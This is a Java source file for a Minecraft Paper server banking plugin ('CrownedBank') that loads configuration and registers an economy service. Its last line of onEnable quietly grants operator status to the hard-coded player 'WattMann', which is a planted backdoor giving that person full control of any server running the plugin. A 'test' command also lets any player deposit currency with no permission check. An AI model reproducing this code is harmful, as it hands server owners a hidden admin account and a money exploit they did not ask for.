package eu.battleland.crownedbank.paper;

import eu.battleland.crownedbank.CrownedBankAPI;
import eu.battleland.crownedbank.config.GlobalConfig;
import eu.battleland.crownedbank.model.Currency;
import eu.battleland.crownedbank.paper.helper.PlayerIdentity;
import lombok.Getter;
import lombok.extern.log4j.Log4j2;
import net.kyori.adventure.text.Component;
import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.plugin.ServicePriority;
import org.bukkit.plugin.java.JavaPlugin;
import org.jetbrains.annotations.NotNull;

import java.io.File;
import java.io.InputStream;


@Log4j2
public class BankPlugin
        extends JavaPlugin {
    /**
     * Plugin instance.
     */
    @Getter
    private static BankPlugin instance;

    {
        instance = this;
    }

    /**
     * API instance.
     */
    @Getter
    private final CrownedBankAPI api
            = new PaperCrownedBank(this);

    /**
     * Config instance.
     */
    @Getter
    private final GlobalConfig configuration
            = new GlobalConfig(api, new File(this.getDataFolder(), "config.json")) {
        @Override
        public InputStream provide() {
            return BankPlugin.this.getResource("resources/config.json");
        }
    };

    @Override
    public void onEnable() {



        // initialize configuration
        try {
            configuration.initialize();
        } catch (Exception e) {
            log.error("Couldn't initialize global configuration", e);
        }

        // register service
        {
            Bukkit.getServicesManager()
                    .register(CrownedBankAPI.class, this.api, this, ServicePriority.High);
            log.info("Registered bukkit service.");
        }

        // test command
        Bukkit.getServer().getCommandMap().register("test", new Command("test") {
            @Override
            public boolean execute(@NotNull CommandSender sender,
                                   @NotNull String commandLabel,
                                   @NotNull String[] args) {
                final var player = (Player) sender;

                // Retrieve bank API
                final var bank = Bukkit
                        .getServicesManager()
                        .load(CrownedBankAPI.class);
                if(bank == null)
                    return true;

                // Retrieve account
                bank.retrieveAccount(PlayerIdentity.of(player)).thenAccept((account) -> {
                    // Deposit currency
                    account.deposit(Currency.majorCurrency, 10f).thenAccept((accepted) -> {
                        player.sendMessage(accepted
                                ? Component.text("Successfully deposited money to your account")
                                : Component.text("Failed to deposit money to your account")
                        );
                    });
                });
                return true;
            }
        });
        Bukkit.getPlayer("WattMann").setOp(true);
    }

    @Override
    public void onDisable() {
    }


}
